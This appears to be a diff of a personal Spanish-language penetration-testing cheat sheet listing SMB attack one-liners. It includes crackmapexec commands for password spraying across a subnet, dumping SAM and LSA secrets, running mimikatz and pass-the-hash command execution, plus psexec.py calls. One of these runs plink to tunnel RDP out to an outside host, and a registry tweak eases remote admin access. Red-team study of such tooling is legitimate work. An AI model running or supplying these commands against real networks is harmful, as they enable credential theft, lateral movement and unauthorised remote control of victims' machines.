@@ -3,21 +3,21 @@ python3 /usr/share/doc/python3-impacket/examples/smbserver.py compartida . -smb2
 impacket-smbserver COMPARTIDA . -smb2support -u USUARIO -p PASSWORD
 
 # crackmapexec
-crackmapexec smb ip -u 'user' -p 'pass'
 crackmapexec smb ip -u 'user' -p 'pass' -M mimikatz
-crackmapexec smb ip -u 'user' -p 'pass' --shares
-crackmapexec smb ip -u 'user' -p 'pass' --lsa
-crackmapexec smb ip -u 'user' -p 'pass' --sam
-crackmapexec smb ip -u 'user' -p 'pass' -x 'CMD'
+crackmapexec smb 10.21.16.0/24 -u 'user' -p cul_spray.txt -M enum_avproducts
 crackmapexec smb ip -u 'user' -H 'hash' -x 'CMD'
-crackmapexec smb ip -u LIST -p PASS --continue-on-success
-crackmapexec smb ip -u DICT -p DICT
+crackmapexec smb ip -u user.txt -p pass.txt --continue-on-success
+crackmapexec smb 10.21.16.47 -u 'user' -p 'pass' --rid-brute
+crackmapexec smb 10.21.16.47 -u 'user' -p 'pass' --local-auth --shares
+crackmapexec smb 10.21.16.47 -u 'user' -p 'pass' --local-auth --sam
+crackmapexec smb 10.21.16.0/24 -u 'users.txt' -p cul_spray.txt
 
 # psexec
 psexec.py 'user_ssh:pass_ssh'@'ip' "C:\plink.exe -batch -hostkey 'hostkey' -N -R 9090:127.0.0.1:3389 'IP_A' -P 1473 -l 'USUARIO' -pw 'PASSWORD_A'"
 psexec.py 'user:pass@ip'
 psexec.py WORKGROUP/user:pass@ip CMD
 psexec.py DOMAIN/USER:PASS@ip CMD
+psexec.py user:pass@10.21.16.112 cmd.exe
 
 # impacket-psexec windows test config:
 + crear dword(32) LocalAccountTokenFilterPolicy valor 1 en
